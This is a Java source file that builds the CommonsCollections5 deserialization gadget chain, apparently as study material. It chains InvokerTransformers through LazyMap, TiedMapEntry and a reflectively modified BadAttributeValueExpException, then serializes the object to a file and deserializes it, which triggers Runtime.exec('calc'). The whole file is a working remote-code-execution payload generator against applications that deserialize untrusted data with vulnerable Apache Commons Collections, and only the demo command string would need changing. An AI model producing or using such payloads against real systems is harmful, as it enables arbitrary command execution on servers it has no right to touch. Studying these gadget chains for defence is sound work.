package Seri.CCGadgets;

import org.apache.commons.collections.keyvalue.TiedMapEntry;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections5 {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
//        new BadAttributeValueExpException();
//        new TiedMapEntry();
//        new LazyMap();

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class,
                        Class[].class }, new Object[] { "getRuntime",
                        new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class,
                        Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class },
                        new String[] { "calc" }),
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap ,chainedTransformer);
        TiedMapEntry entry = new TiedMapEntry(lazyMap ,"");

        BadAttributeValueExpException b = new BadAttributeValueExpException(null);
        Field field = b.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(b ,entry);

        serialize(b);

        unserialize("bin/CC5.bin");

    }
    public static void serialize(Object object) throws IOException {
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(object);
        oos.close();

        FileOutputStream fos = new FileOutputStream("bin/CC5.bin");
        barr.writeTo(fos);
        fos.close();

        System.out.println(barr);
    }
    public static void unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        ois.readObject();
        ois.close();
    }
}
